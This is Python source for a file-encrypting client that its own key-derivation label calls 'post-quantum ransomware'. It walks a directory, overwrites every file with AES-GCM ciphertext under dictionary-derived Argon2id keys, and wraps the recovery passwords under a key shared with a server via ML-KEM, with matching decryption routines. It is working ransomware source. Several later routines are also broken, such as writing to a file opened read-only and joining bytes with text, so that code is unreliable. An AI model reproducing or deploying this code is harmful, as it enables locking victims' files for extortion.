import os
import secrets
import json
from base64 import b64encode, b64decode
from cryptography.hazmat.primitives.kdf.argon2 import Argon2id
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
from pqcrypto.kem.ml_kem_1024 import encrypt

DICTIONARY_PATH = "/usr/share/dict/words"
DIRECTORY_NAME = "test"
ID_SIZE = 4  # Size of the file ID in bytes
SALT_SIZE = 16  # Size of the salt for Argon2id
IV_SIZE = 12  # AES-GCM standard IV size (96 bits)
TAG_SIZE = 16  # AES-GCM standard tag size (128 bits)
KEY_SIZE = 32  # 256 bits for AES-256


class Client:

    server_kem_public_key: bytes
    communication_key: bytes

    def __init__(self, server_kem_public_key: bytes):
        """
        Initialize the Client with the server's KEM public key.

        :param self: The Client instance.
        :param server_kem_public_key: The server's KEM public key.
        :return: None
        """

        self.server_kem_public_key = server_kem_public_key

    def establish_shared_secret(self) -> tuple[bytes, bytes]:
        """
        Establish a shared secret with the server using ML-KEM.

        :param self: The Client instance.
        :return: The ciphertext and the original plaintext shared secret.
        :rtype: tuple[bytes, bytes]
        """

        ciphertext, plaintext_original = encrypt(self.server_kem_public_key)

        return ciphertext, plaintext_original

    def derive_shared_secret(self, shared_secret: bytes):
        """
        Derive a communication key from the shared secret.

        :param self: The Client instance.
        :param shared_secret: The shared secret established with the server.
        :return: None
        """

        hkdf = HKDF(
            algorithm=hashes.SHA256(),
            length=KEY_SIZE,
            salt=None,
            info=b"Post-quantum ransomware communication key",
        )

        self.communication_key = hkdf.derive(shared_secret)

    def get_random_password(self) -> str:
        """
        Get a random password from the dictionary file.

        :param self: The Client instance.
        :return: The random password.
        :rtype: str
        """

        if not os.path.exists(DICTIONARY_PATH):
            raise FileNotFoundError(f"Dictionary file not found at {DICTIONARY_PATH}")

        with open(DICTIONARY_PATH, "r", encoding="utf-8") as f:
            words = f.read().splitlines()

        password = secrets.choice(words).strip()

        return password

    def derive_password_key(self, password: str, salt: bytes) -> bytes:
        """
        Derive a key from a password using Argon2id.

        :param self: The Client instance.
        :param password: The password to derive the key from.
        :param salt: The salt to use for key derivation.
        :return: The derived password key.
        :rtype: bytes
        """

        kdf = Argon2id(
            salt=salt,
            length=KEY_SIZE,
            iterations=1,
            lanes=4,
            memory_cost=64 * 1024,
            ad=None,
            secret=None,
        )

        password_key = kdf.derive(bytes(password, "utf-8"))

        return password_key

    def encrypt(self, key: bytes, plaintext: bytes) -> tuple[bytes, bytes, bytes]:
        """
        Encrypt plaintext using AES-256-GCM.

        :param self: The Client instance.
        :param key: The encryption key.
        :param plaintext: The plaintext to encrypt.
        :return: The IV, ciphertext, and tag.
        :rtype: tuple[bytes, bytes, bytes]
        """

        iv = os.urandom(IV_SIZE)
        encryptor = Cipher(
            algorithms.AES(key),
            modes.GCM(iv),
        ).encryptor()

        ciphertext = encryptor.update(plaintext) + encryptor.finalize()
        tag = encryptor.tag

        return iv, ciphertext, tag

    def decrypt(self, key: bytes, iv: bytes, ciphertext: bytes, tag: bytes) -> bytes:
        """
        Decrypt ciphertext using AES-256-GCM.

        :param self: The Client instance.
        :param key: The decryption key.
        :param iv: The initialization vector used during encryption.
        :param ciphertext: The ciphertext to decrypt.
        :param tag: The authentication tag from encryption.
        :return: The decrypted plaintext.
        :rtype: bytes
        """

        decryptor = Cipher(
            algorithms.AES(key),
            modes.GCM(iv, tag),
        ).decryptor()

        plaintext = decryptor.update(ciphertext) + decryptor.finalize()

        return plaintext

    def encrypt_file(self, id: int, file_path: str, root_key: bytes) -> str:
        """
        Encrypt a file and its file key and store the metadata.

        :param self: The Client instance.
        :param id: The unique identifier for the file.
        :param file_path: The path to the file to encrypt.
        :param root_key: The root key to encrypt the file key.
        :return: The password used to derive the file key.
        :rtype: str
        """

        password = self.get_random_password()
        password_salt = os.urandom(SALT_SIZE)
        file_key = self.derive_password_key(password, password_salt)

        with open(file_path, "rb") as f:
            plaintext = f.read()

        file_iv, file_ciphertext, file_tag = self.encrypt(file_key, plaintext)
        key_iv, key_ciphertext, key_tag = self.encrypt(root_key, file_key)

        with open(file_path, "wb") as f:
            f.write(
                id.to_bytes(ID_SIZE)
                + password_salt
                + key_iv
                + key_tag
                + key_ciphertext
                + file_iv
                + file_tag
                + file_ciphertext
            )

        return password

    def decrypt_file_with_password(
        self, file_path: str, data_iv: bytes, data_ciphertext: bytes, data_tag: bytes
    ):
        """
        Decrypt a file using a password.

        :param self: The Client instance.
        :param file_path: The path to the encrypted file.
        :param data_iv: The IV used for encrypting the password.
        :param data_ciphertext: The ciphertext of the password.
        :param data_tag: The authentication tag for the password.
        :return: None
        """

        # Decrypt the password sent by the server
        password = self.decrypt(
            self.communication_key, data_iv, data_ciphertext, data_tag
        ).decode("utf-8")
        print(f"The file password is : {password}")

        # Decrypt the file using the password
        with open(file_path, "rb") as f:
            f.read(ID_SIZE)  # Skip file ID
            password_salt = f.read(SALT_SIZE)
            f.read(IV_SIZE)  # Skip key IV
            f.read(TAG_SIZE)  # Skip key tag
            f.read(KEY_SIZE)  # Skip key ciphertext
            file_iv = f.read(IV_SIZE)
            file_tag = f.read(TAG_SIZE)
            file_ciphertext = f.read()

        file_key = self.derive_password_key(password, password_salt)
        plaintext = self.decrypt(file_key, file_iv, file_ciphertext, file_tag)

        with open(file_path, "wb") as f:
            f.write(plaintext)

    def decrypt_file_with_root_key(self, file_path: str, root_key: bytes):
        """
        Decrypt a file using the root key.

        :param self: The Client instance.
        :param file_path: The path to the encrypted file.
        :param root_key: The root key to decrypt the file key.
        :return: None
        """

        with open(file_path, "rb") as f:
            f.read(ID_SIZE)  # Skip file ID
            f.read(SALT_SIZE)  # Skip password salt
            key_iv = f.read(IV_SIZE)
            key_tag = f.read(TAG_SIZE)
            key_ciphertext = f.read(KEY_SIZE)
            file_iv = f.read(IV_SIZE)
            file_tag = f.read(TAG_SIZE)
            file_ciphertext = f.read()

        file_key = self.decrypt(root_key, key_iv, key_ciphertext, key_tag)
        plaintext = self.decrypt(file_key, file_iv, file_ciphertext, file_tag)

        with open(file_path, "wb") as f:
            f.write(plaintext)

    def encrypt_files(self) -> tuple[bytes, bytes, bytes]:
        """
        Encrypt all files in the specified directory and store the encrypted root key and the master password salt in a file.

        :param self: The Client instance.
        :return: The encrypted passwords to send to the server.
        :rtype: tuple[bytes, bytes, bytes]
        """

        master_password = self.get_random_password()
        root_key = os.urandom(KEY_SIZE)
        passwords_for_server = [master_password]
        id = 1

        # Encrypt each file
        for root, _, files in os.walk(DIRECTORY_NAME):
            for file in files:
                file_path = os.path.join(root, file)
                password = self.encrypt_file(id, file_path, root_key)
                passwords_for_server.append(password)
                id += 1

        # Encrypt the root key
        master_password_salt = os.urandom(SALT_SIZE)
        master_password_key = self.derive_password_key(
            master_password, master_password_salt
        )
        root_key_iv, root_key_ciphertext, root_key_tag = self.encrypt(
            master_password_key, root_key
        )

        # Save the root key metadata and the master password salt
        id = 0  # ID 0 is reserved for the root key metadata
        with open(f"{DIRECTORY_NAME}/{DIRECTORY_NAME}.enc", "wb") as f:
            f.write(
                id.to_bytes(ID_SIZE)
                + master_password_salt
                + root_key_iv
                + root_key_tag
                + root_key_ciphertext
            )

        # Encrypt the data to send to the server
        data = "\n".join(passwords_for_server).encode("utf-8")
        data_iv, data_ciphertext, data_tag = self.encrypt(self.communication_key, data)

        return data_iv, data_ciphertext, data_tag

    def decrypt_files(self, data_iv: bytes, data_ciphertext: bytes, data_tag: bytes):
        """
        Decrypt all files in the specified directory using the master password.

        :param self: The Client instance.
        :param data_iv: The IV used for encrypting the master password.
        :param data_ciphertext: The ciphertext of the master password.
        :param data_tag: The authentication tag for the master password.
        :return: None
        """

        # Decrypt the master password sent by the server
        master_password = self.decrypt(
            self.communication_key, data_iv, data_ciphertext, data_tag
        ).decode("utf-8")
        print(f"The master password is: {master_password}")

        # Decrypt the root key
        with open(f"{DIRECTORY_NAME}/{DIRECTORY_NAME}.enc", "rb") as f:
            f.read(ID_SIZE)  # Skip ID
            master_password_salt = f.read(SALT_SIZE)
            root_key_iv = f.read(IV_SIZE)
            root_key_tag = f.read(TAG_SIZE)
            root_key_ciphertext = f.read()

        master_password_key = self.derive_password_key(
            master_password, master_password_salt
        )
        root_key = self.decrypt(
            master_password_key, root_key_iv, root_key_ciphertext, root_key_tag
        )

        # Decrypt each file using the root key
        for root, _, files in os.walk(DIRECTORY_NAME):
            for file in files:
                file_path = os.path.join(root, file)
                if file_path == f"{DIRECTORY_NAME}/{DIRECTORY_NAME}.enc":
                    continue
                self.decrypt_file_with_root_key(file_path, root_key)

        # Remove the root key metadata file
        os.remove(f"{DIRECTORY_NAME}/{DIRECTORY_NAME}.enc")

    def get_file_id(self, file_path: str) -> tuple[bytes, bytes, bytes]:
        """
        Get the unique identifier of the file from its metadata.

        :param self: The Client instance.
        :param file_path: The path to the encrypted file.
        :return: The file ID to send to the server.
        :rtype: tuple[bytes, bytes, bytes]
        """

        with open(file_path, "rb") as f:
            id_bytes = f.read(ID_SIZE)
            file_id = int.from_bytes(id_bytes)

        # Encrypt the data to send to the server
        data_iv, data_ciphertext, data_tag = self.encrypt(
            self.communication_key, f"{file_id}".encode("utf-8")
        )

        return data_iv, data_ciphertext, data_tag

    def get_master_password_data(self) -> tuple[bytes, bytes, bytes]:
        """
        Get the data required to change the master password.

        :param self: The Client instance.
        :return: The data for the server to update the master password.
        :rtype: tuple[bytes, bytes, bytes]
        """

        with open(f"{DIRECTORY_NAME}/{DIRECTORY_NAME}.enc", "rb") as f:
            f.read(ID_SIZE)  # Skip ID
            master_password_salt = f.read(SALT_SIZE)
            root_key_iv = f.read(IV_SIZE)
            root_key_tag = f.read(TAG_SIZE)
            root_key_ciphertext = f.read()

        new_master_password = self.get_random_password()

        # Encrypt the data to send to the server
        data = "\n".join(
            [
                master_password_salt,
                root_key_iv,
                root_key_tag,
                root_key_ciphertext,
                new_master_password,
            ]
        ).encode("utf-8")
        data_iv, data_ciphertext, data_tag = self.encrypt(self.communication_key, data)

        return data_iv, data_ciphertext, data_tag

    def change_master_password_data(
        self, data_iv: bytes, data_ciphertext: bytes, data_tag: bytes
    ):
        """
        Update the master password data in the metadata file.

        :param self: The Client instance.
        :param data_iv: The IV used for encrypting the master password data.
        :param data_ciphertext: The ciphertext of the master password data.
        :param data_tag: The authentication tag for the master password data.
        :return: None
        """

        # Decrypt the master password data sent by the server
        data = self.decrypt(self.communication_key, data_iv, data_ciphertext, data_tag)
        master_password_data = data.decode("utf-8").splitlines()
        master_password_salt = master_password_data[0]
        root_key_iv = master_password_data[1]
        root_key_tag = master_password_data[2]
        root_key_ciphertext = master_password_data[3]
        id = 0

        # Update the metadata file
        with open(f"{DIRECTORY_NAME}/{DIRECTORY_NAME}.enc", "rb") as f:
            f.write(
                id.to_bytes(
                    ID_SIZE
                    + master_password_salt
                    + root_key_iv
                    + root_key_tag
                    + root_key_ciphertext
                )
            )
